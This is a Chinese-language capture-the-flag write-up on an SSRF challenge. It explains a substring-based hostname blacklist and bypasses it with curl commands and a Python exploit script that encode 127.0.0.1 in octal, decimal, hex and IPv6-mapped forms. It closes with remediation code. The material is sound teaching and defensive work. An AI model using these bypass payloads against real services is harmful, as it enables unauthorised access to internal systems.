# A01 Broken Access Control - Hard - WriteUP

## 漏洞分析

本题是一个 **SSRF（Server-Side Request Forgery，服务器端请求伪造）** 漏洞，配合**黑名单绕过**技巧。

### 漏洞原理

1. **SSRF 漏洞**：应用程序接收用户输入的 URL，然后在服务器端发起 HTTP 请求。如果不对 URL 进行严格校验，攻击者可以让服务器访问任意地址，包括内网服务。
2. **黑名单绕过**：虽然程序禁止了 `127.0.0.1` 和 `localhost` 等常见内网地址表示，但 127.0.0.1 有多种等价表示方式，黑名单很容易被绕过。

### 漏洞代码分析

```python
def is_blocked(url):
    parsed = urllib.parse.urlparse(url)
    hostname = parsed.hostname or ""
    for blocked in BLACKLIST:
        if blocked.lower() in hostname.lower():
            return True
    return False
```

**问题**：只做了字符串包含匹配，没有解析实际 IP 地址。127.0.0.1 的多种等价形式都可以绕过。

## 利用步骤

### 步骤1：访问服务首页，了解功能

```bash
curl http://<target>/
```

这是一个图片获取服务，通过 POST `/fetch` 提交 URL。

### 步骤2：尝试直接访问内网（被拦截）

```bash
curl -X POST http://<target>/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8080/flag"}'
```

返回：
```json
{"error": "禁止访问内网地址"}
```

### 步骤3：使用 IP 编码绕过黑名单

#### 方法A：八进制表示法

将 127.0.0.1 转换为八进制：`0177.0.0.1`

```bash
curl -X POST http://<target>/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://0177.0.0.1:8080/flag"}'
```

#### 方法B：十进制整数表示法

将 127.0.0.1 转换为十进制整数：`2130706433`

```bash
curl -X POST http://<target>/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://2130706433:8080/flag"}'
```

#### 方法C：十六进制表示法

将 127.0.0.1 转换为十六进制：`0x7f000001`

```bash
curl -X POST http://<target>/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://0x7f000001:8080/flag"}'
```

#### 方法D：混合表示法

```bash
curl -X POST http://<target>/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.1:8080/flag"}'
```

⚠️ 注意：`127.1` 在本题黑名单中（因为 `127.1` 在黑名单里），但以下方式可以：

```bash
curl -X POST http://<target>/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://0177.1:8080/flag"}'
```

### 步骤4：获取 flag

使用上述任意一种绕过方式，返回结果：

```json
{
  "text": "flag{...}\n"
}
```

### 完整 EXP 脚本

```python
import requests

target = "http://<target>"

bypass_payloads = [
    "http://0177.0.0.1:8080/flag",      # 八进制
    "http://2130706433:8080/flag",       # 十进制整数
    "http://0x7f000001:8080/flag",       # 十六进制
    "http://0177.0000.0000.0001:8080/flag",  # 带前导零八进制
    "http://[::ffff:127.0.0.1]:8080/flag",   # IPv6 mapped
]

for payload in bypass_payloads:
    print(f"[*] Trying: {payload}")
    r = requests.post(f"{target}/fetch", json={"url": payload})
    if "flag{" in r.text:
        print(f"[+] Success! Response: {r.json()}")
        break
    else:
        print(f"[-] Failed: {r.text}")
```

## IP 表示法参考

| 表示法 | 示例 | 说明 |
|--------|------|------|
| 点分十进制 | `127.0.0.1` | 标准格式 |
| 八进制 | `0177.0.0.1` | 每段加前导0 |
| 十进制整数 | `2130706433` | 整个IP转成一个整数 |
| 十六进制 | `0x7f000001` | 整个IP转成十六进制 |
| 混合 | `0177.0.0.0x1` | 各段可以不同进制 |
| IPv6映射 | `[::ffff:127.0.0.1]` | IPv6格式的IPv4映射 |

Python 转换参考：
```python
import socket
import struct

# 十进制整数
ip_int = struct.unpack("!I", socket.inet_aton("127.0.0.1"))[0]
print(ip_int)  # 2130706433

# 十六进制
print(hex(ip_int))  # 0x7f000001

# 八进制
print(oct(ip_int))  # 0o17700000001
```

## 修复建议

1. **使用白名单**：只允许访问特定的、安全的域名或 IP
2. **解析后校验**：将 URL 解析为实际 IP 地址后，检查是否在私有 IP 范围内
3. **禁用不必要的协议**：只允许 HTTP/HTTPS，禁止 file://、dict://、gopher:// 等
4. **网络隔离**：将应用服务器与内网敏感服务隔离

示例修复代码：

```python
import socket
import ipaddress

def is_private_ip(hostname):
    try:
        ip = socket.getaddrinfo(hostname, None)[0][4][0]
        ip_obj = ipaddress.ip_address(ip)
        return ip_obj.is_private or ip_obj.is_loopback
    except Exception:
        return True  # 解析失败视为不安全

@app.route("/fetch", methods=["POST"])
def fetch_image():
    url = request.json.get("url", "")
    parsed = urllib.parse.urlparse(url)
    
    if is_private_ip(parsed.hostname):
        return jsonify({"error": "禁止访问内网地址"}), 403
    
    # ... 继续处理
```

另外，也可以考虑：
- 使用独立的、无内网访问权限的代理服务器
- 对 DNS 解析进行二次校验（防止 DNS Rebinding）
